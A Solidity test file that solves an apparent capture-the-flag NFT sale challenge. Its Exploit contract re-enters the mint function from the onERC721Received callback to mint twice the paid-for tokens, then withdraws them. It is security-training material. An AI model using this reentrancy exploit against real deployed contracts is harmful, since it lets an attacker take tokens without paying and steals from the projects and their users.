// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.10;

import "./utils/BaseTest.sol";

import "src/tokens/NftSaleChallenge.sol";

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Exploit is IERC721Receiver {
    bool private doubleMinted;
    NftSale private nft;
    address private owner;
    uint256 private amountToMint;

    constructor(NftSale _nft, uint256 _amountToMint) payable {
        nft = _nft;
        amountToMint = _amountToMint;
        owner = msg.sender;
    }

    function exploit() external {
        uint256 nftToMint = amountToMint / 2;
        nft.mint{value: nft.getNFTPrice() * nftToMint}(nftToMint);
    }

    function withdraw(uint256 tokenId) external {
        // Transfer from contract to the owner of the exploit contract
        nft.safeTransferFrom(address(this), owner, tokenId);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        if (!doubleMinted) {
            doubleMinted = true;
            uint256 nftToMint = amountToMint / 2;
            nft.mint{value: nft.getNFTPrice() * nftToMint}(nftToMint);
        }

        return IERC721Receiver.onERC721Received.selector;
    }
}

contract TestNftSaleChallenge is BaseTest {
    NftSaleChallenge private challenge;
    NftSale private nft;

    address private player;

    constructor() {
        // Created (during `setUp()`) users will be available in `users` state variable

        string[] memory userLabels = new string[](1);
        userLabels[0] = "Player";
        preSetUp(userLabels.length, 100 ether, userLabels);
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();

        challenge = new NftSaleChallenge();
        nft = challenge.token();
        player = users[0];
    }

    function testExploit() public {
        runTest();
    }

    function exploit() internal override {
        vm.startPrank(player);

        // calculate how much we need to get 60 nft
        uint256 nftToMint = 60;
        uint256 nftPrice = nft.getNFTPrice() * nftToMint;

        // deploy the exploit contract sending the needed funds
        Exploit exploitContract = new Exploit{value: nftPrice}(nft, nftToMint);

        // Assert the contract own no nft
        assertEq(nft.balanceOf(address(exploitContract)), 0);

        // The exploit contract will leverage a reentrancy attack vector
        // by re-calling the NftSale contract on `onERC721Received` callback
        exploitContract.exploit();

        // Assert the contract own 31 nft
        assertEq(nft.balanceOf(address(exploitContract)), nftToMint);

        vm.stopPrank();
    }

    function success() internal override {
        /** SUCCESS CONDITIONS */

        assertEq(challenge.isSolved(), true);
    }
}
